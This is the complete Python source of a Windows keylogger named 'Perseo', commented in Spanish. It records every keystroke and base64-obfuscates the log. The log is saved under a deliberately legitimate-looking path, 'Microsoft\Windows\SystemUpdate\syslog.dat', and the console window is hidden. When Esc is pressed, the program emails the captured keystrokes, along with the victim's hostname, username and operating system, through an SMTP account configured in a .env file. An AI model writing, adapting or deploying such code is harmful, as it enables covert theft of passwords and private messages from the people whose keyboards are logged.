import keyboard
import time
import sys
import base64
import os
import ctypes
import smtplib
import socket
import platform
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
from colorama import init, Fore, Style

# Inicializar colorama
init(autoreset=True)

def print_banner():

    perseo_ascii = r"""
    ██████╗ ███████╗██████╗ ███████╗███████╗ ██████╗ 
    ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔═══██╗
    ██████╔╝█████╗  ██████╔╝███████╗█████╗  ██║   ██║
    ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██╔══╝  ██║   ██║
    ██║     ███████╗██║  ██║███████║███████╗╚██████╔╝
    ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ 
    """
    
    # Información adicional
    subtitle = "Capturador de teclado"
    author = "Creado por Mix Dark"
    date_info = f"Fecha: 29-05-2025"
    version = "Versión: 1.0"
    
    # Línea decorativa
    border = Fore.WHITE + "=" * 55
    
    # Imprimir banner
    print(Fore.WHITE + perseo_ascii)
    print(border)
    
    # Información centrada
    print(Fore.WHITE  + Style.BRIGHT + subtitle.center(50))
    print(Fore.WHITE  + author.center(50))
    print(Fore.WHITE  + date_info.center(50))
    print(Fore.WHITE + f"{version}".center(50))
    print(border + "\n")

# Archivo donde se guardarán las pulsaciones ofuscadas
# Lo guardamos en una ubicación que parezca legítima
appdata_path = os.getenv('APPDATA')
output_file = os.path.join(appdata_path, "Microsoft", "Windows", "SystemUpdate", "syslog.dat")

# Crear directorios si no existen
os.makedirs(os.path.dirname(output_file), exist_ok=True)

# Buffer para manejar la funcionalidad de Backspace
text_buffer = ""

# Variable para controlar si el programa sigue ejecutándose
running = True

# Función para cargar la configuración del archivo .env
def cargar_configuracion_env():
    config = {
        "EMAIL_USER": "",
        "EMAIL_PASSWORD": "",
        "EMAIL_RECEIVER": "",
        "SMTP_SERVER": "smtp.gmail.com",
        "SMTP_PORT": 587
    }
    
    # Ruta del archivo .env (en el mismo directorio que el script)
    env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '.env')
    
    # Verificar si el archivo existe
    if os.path.exists(env_path):
        try:
            with open(env_path, 'r') as file:
                for line in file:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        key, value = line.split('=', 1)
                        config[key] = value
        except Exception:
            pass
    
    return config

# Cargar configuración de correo
config_email = cargar_configuracion_env()

# Diccionario para mapear nombres de teclas especiales a sus caracteres
special_keys = {
    'period': '.',
    'comma': ',',
    'decimal': '.',  # Punto decimal del teclado numérico
    'space': ' ',
    'enter': '\n',
    'tab': '\t',     # Tecla Tab
    'slash': '/',
    'backslash': '\\',
    'minus': '-',
    'add': '+',  # Teclado numérico
    'subtract': '-',  # Teclado numérico
    'multiply': '*',  # Teclado numérico
    'divide': '/',  # Teclado numérico
    'semicolon': ';',
    'quote': "'",
    'left_bracket': '[',
    'right_bracket': ']',
    'equal': '=',
    'grave': '`',
}

# Mapeo de números del teclado numérico
numpad_keys = {
    'numpad_0': '0',
    'numpad_1': '1',
    'numpad_2': '2',
    'numpad_3': '3',
    'numpad_4': '4',
    'numpad_5': '5',
    'numpad_6': '6',
    'numpad_7': '7',
    'numpad_8': '8',
    'numpad_9': '9',
}

# Combinamos todos los mapeos
special_keys.update(numpad_keys)

def obtener_info_sistema():
    nombre_equipo = socket.gethostname()
    usuario = os.getenv('USERNAME')
    sistema_operativo = platform.system() + " " + platform.release()
    fecha_actual = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    
    return {
        "equipo": nombre_equipo,
        "usuario": usuario,
        "sistema": sistema_operativo,
        "fecha": fecha_actual
    }

def enviar_correo():
    try:
        # Verificar que el archivo existe
        if not os.path.exists(output_file):
            return False
        
        # Verificar que tenemos la configuración de correo
        if not config_email["EMAIL_USER"] or not config_email["EMAIL_PASSWORD"] or not config_email["EMAIL_RECEIVER"]:
            return False
        
        # Obtener información del sistema
        info = obtener_info_sistema()
        
        # Crear el mensaje
        mensaje = MIMEMultipart()
        mensaje['From'] = config_email["EMAIL_USER"]
        mensaje['To'] = config_email["EMAIL_RECEIVER"]
        mensaje['Subject'] = "Información de registro"
        
        # Cuerpo del mensaje
        cuerpo = f"""Equipo: {info['equipo']}
Usuario: {info['usuario']}
Sistema Operativo: {info['sistema']}
Fecha del reporte: {info['fecha']}
"""
        mensaje.attach(MIMEText(cuerpo, 'plain'))
        
        # Adjuntar el archivo
        with open(output_file, 'rb') as archivo:
            adjunto = MIMEBase('application', 'octet-stream')
            adjunto.set_payload(archivo.read())
        
        encoders.encode_base64(adjunto)
        adjunto.add_header('Content-Disposition', f'attachment; filename="syslog.dat"')
        mensaje.attach(adjunto)
        
        # Conectar al servidor SMTP y enviar el correo
        with smtplib.SMTP(config_email["SMTP_SERVER"], config_email["SMTP_PORT"]) as servidor:
            servidor.starttls()
            servidor.login(config_email["EMAIL_USER"], config_email["EMAIL_PASSWORD"])
            servidor.send_message(mensaje)
        
        return True
    
    except Exception:
        return False

def ofuscar_texto(texto):
    # Codificar el texto a bytes
    texto_bytes = texto.encode('utf-8')
    # Codificar los bytes en base64
    texto_ofuscado = base64.b64encode(texto_bytes).decode('utf-8')
    return texto_ofuscado

def update_file():
    texto_ofuscado = ofuscar_texto(text_buffer)
    with open(output_file, "w", encoding="utf-8") as f:
        f.write(texto_ofuscado)

def on_key_event(event):
    global text_buffer, running
    
    # Solo procesamos eventos de pulsación (no liberación)
    if event.event_type == 'down':
        # Detener el script si se presiona Esc
        if event.name == 'esc':
            update_file()
            # Intentar enviar el correo antes de salir
            enviar_correo()
            running = False  # Señal para detener el bucle principal
            keyboard.unhook_all()
            return
            
        # Manejar Backspace
        if event.name == 'backspace':
            if text_buffer:
                text_buffer = text_buffer[:-1]
                update_file()
            return
            
        # Ignorar otras teclas de control
        if event.name in ['shift', 'ctrl', 'alt', 'right shift', 'right ctrl', 
                         'right alt', 'caps lock', 'num lock', 'scroll lock',
                         'up', 'down', 'left', 'right', 'home', 'end', 'page up', 
                         'page down', 'insert', 'delete']:
            return
            
        # Manejar teclas especiales mapeadas
        if event.name in special_keys:
            text_buffer += special_keys[event.name]
            update_file()
            return
            
        # Capturar teclas normales (un solo carácter o números)
        if len(event.name) == 1:
            text_buffer += event.name
            update_file()

def start_keylogger():
    global running
    
    # Mostrar el banner
    print_banner()
    
    print(Fore.YELLOW + "Iniciando captura de datos...")
    print(Fore.YELLOW + "Presione ESC para detener y enviar informe.")
    
    # Pausa breve para que el usuario pueda ver el banner
    time.sleep(3)
    
    # Ocultar la consola después de mostrar el banner
    if os.name == 'nt':  # Solo en Windows
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # Si el archivo no existe, crearlo
    if not os.path.exists(output_file):
        with open(output_file, "w", encoding="utf-8") as f:
            f.write("")
    
    # Registra el hook para todos los eventos de teclado
    keyboard.hook(on_key_event)
    
    # Mantiene el programa en ejecución hasta que se presione Esc
    while running:
        time.sleep(0.1)
        # Si running se vuelve False (cuando se presiona Esc), saldremos del bucle
    
    # Asegurarse de que todos los hooks se eliminan
    keyboard.unhook_all()
    sys.exit(0)  # Forzar la salida del programa

if __name__ == "__main__":
    running = True
    start_keylogger()